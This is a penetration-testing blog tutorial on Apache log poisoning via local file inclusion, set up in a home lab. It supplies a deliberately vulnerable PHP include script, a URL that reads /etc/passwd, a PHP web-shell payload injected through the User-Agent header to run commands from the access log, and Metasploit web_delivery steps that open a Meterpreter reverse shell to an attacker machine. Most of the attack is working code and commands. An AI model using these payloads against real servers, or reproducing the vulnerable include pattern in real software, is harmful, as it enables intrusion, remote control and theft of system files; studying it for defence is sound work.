<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/kali-linux/" rel="category tag">Kali Linux</a>, <a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a>, <a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
            <h1 class="post-title entry-title">Apache Log Poisoning through LFI</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/" rel="bookmark"><time class="entry-date published" datetime="2017-02-14T07:08:15+00:00">February 14, 2017</time><time class="updated" datetime="2025-05-27T12:32:14+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we are demonstrating how a PHP file with include function can lead to LFI log injection attack in any web server. Please read our previous article “<a href="https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/"><span style="color: #0000ff;">Beginner Guide to File Inclusion Attack (LFI/RFI)</span>”</a> and “<a href="https://www.hackingarticles.in/web-server-lab-setup-for-penetration-testing/">Configure Web Server for Penetration Testing (Beginner Guide)”</a> that will help you in the configuration of own web server as well as more about LFI vulnerability.</span></p>
<h3><span style="color: #800000;">Requirements</span></h3>
<p><span style="color: #000000;"><strong>Attacker: Kali Linux</strong></span></p>
<p><span style="color: #000000;"><strong>Target: Ubuntu</strong></span></p>
<h3><span style="color: #800000;">Introduction to LFI Log Injection Using PHP Include</span></h3>
<p><span style="color: #000000;">Create a PHP file which will allow the user to include a file through a file parameter. Hence using file parameter we can execute a file that contains malicious code to make unauthorized access is target PC.</span></p>
<p><span style="color: #000000;">Now I had saved given below PHP code inside a text file as <strong>lfi.php </strong>and saved on the desktop.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?php
$file = $_GET['file'];
if(isset($file))
{
include("$file");
}
else
{
include("index.php");
}
?&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-m9-z9nGzt0A/Wcn18tWpRJI/AAAAAAAARmo/L3ZCm6sX_w0T7FcQD2JxSg13BUEQCWGJgCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now login with the user as “root” and create a folder “lfi” inside /var/www/html</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/www/html
mkdir lfi</pre>
<p><span style="color: #000000;">Move <strong>the lfi.php </strong>file from desktop to /var/www/html using given below command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mv /home/raj/Desktop/lfi.php .</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HhkYznN91YE/Wcn19Ys-7uI/AAAAAAAARmw/WmR4TlcmAJ0Odxvhb2w026LWUvz0Ut-SgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Since we had added a php file with include function inside /var/www/html which allow to read the content of another file through it and can lead to LFI attack. Let’s demonstrate it by exploring the following URL to read password files:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">localhost/lfi/lfi.php?file=/etc/passwd</pre>
<p><span style="color: #000000;">From the given image you can observe that the above URL has dumped the following result shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-OzbTVHelQPw/Wcn19gYCuqI/AAAAAAAARm4/DPJ39M9XG2MKnlqPygfMeBgicfXvokpxwCLcBGAs/s1600/3.png"/></span></p>
<h3><span style="color: #800000;">Crafting and Testing LFI via Apache Log Manipulation</span></h3>
<p><span style="color: #000000;">Now I will try to open Apache access.log file through lfi.php on the browser, therefore, give read and write permission to apache2 and then include the <strong>access.log</strong> file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 775 -R /var/log/apache2</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Ndp2mtyjUiw/Wcn198SoWhI/AAAAAAAARm8/aY7QOBTOuiYJXUHi7-xAiJEf5EpkX2GdQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Now to include the acess.log file as file parameter and give following URL inside the browser.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.129/lfi/lfi.php?file=/var/log/apache2/access.log</pre>
<p><span style="color: #000000;">From the given image you can see it is showing created apache logs in the browser. Now turn on burp suite to capture the request of the same web page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YizGNJli0WU/Wcn1-DtxcVI/AAAAAAAARnA/nr6_CWpCI4sB9HJceat-IsUXw55gFY6OgCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Here you will get intercepted data where we need to inject our cmd comment inside user-agent by replacing highlighted data.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-38AOy8BmWK8/Wcn1-Kig7bI/AAAAAAAARnE/Q_aZsPKIS4QGHQwM2pm2FY0fSQh31R6nQCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Add cmd comment</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?php system($_GET['c']); ?&gt;</pre>
<p><span style="color: #000000;">inside user_Agent and send the request with GET parameter as shown in the below image. Then <strong>click</strong> on <strong>forward</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-E4i3GMCWI-w/Wcn1-jo8iII/AAAAAAAARnI/qCDOSzId9pgmgfdUL0JVJddn254lb9DfQCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Here it will dump the log data as well as execute comment given through cmd. From the screenshot, you can view both logs as well as process state.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-JHr-DudufOs/Wcn1-zOQ4TI/AAAAAAAARnQ/xag51Ql4oC0X62KfKdHwu5L0jxTj2dwHgCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">In the same manner, execute<strong> ifconfig</strong> through cmd to verify network interface or can browse the following URL and view the result from inside the given screenshot.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.129/lfi/lfi.php?file=/var/log/apache2/access.log&amp;c=ifconfig</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BuKLBBEyOT8/Wcn1-yx6QvI/AAAAAAAARnM/1zx0LjLGmEE8JGTcBxmQ_yp1AJMhKapdACLcBGAs/s1600/9.png"/></span></p>
<h3><span style="color: #800000;">Exploiting LFI with Metasploit for Reverse Shell</span></h3>
<p><span style="color: #000000;">If you found such kind of vulnerability in any web application then you can use Metasploit platform to exploit web server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;set target 1
msf exploit (web_delivery)&gt; set lhost 192.168.1.123
msf exploit (web_delivery)&gt;set srvport 8081
msf exploit (web_delivery)&gt; set payload php/meterpreter/reverse_tcp
msf exploit (web_delivery)&gt;exploit</pre>
<p><span style="color: #000000;"><strong>Copy</strong> the <strong>highlighted text</strong> shown in below window</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3W6bYa1gzZA/Wcn182CPuGI/AAAAAAAARms/oMXHQYvZ8fUk-_2GzQRtxVHNMFoynu61ACLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;"> <strong>Paste </strong>the above copied malicious code inside URL as shown in the given image and <strong>execute</strong> it <strong>as a command</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1Dmh8VWljoY/Wcn18ioH3NI/AAAAAAAARmk/FOG8KvbTtCoWxSiLUOKucLegVqUF9mZmwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">When the above code gets executed you will get meterpreter session 1.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf exploit (web_delivery)&gt;sessions 1
meterpreter&gt; sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-sFe5iGQxxic/Wcn19E0aCQI/AAAAAAAARm0/3V6VsYGDhlIpA_Mt1TSdKnlcGLddZNrMACLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
<p><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact</span><a href="https://www.linkedin.com/in/aarti--singh/"><strong><span style="color: #000000;"> </span>here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
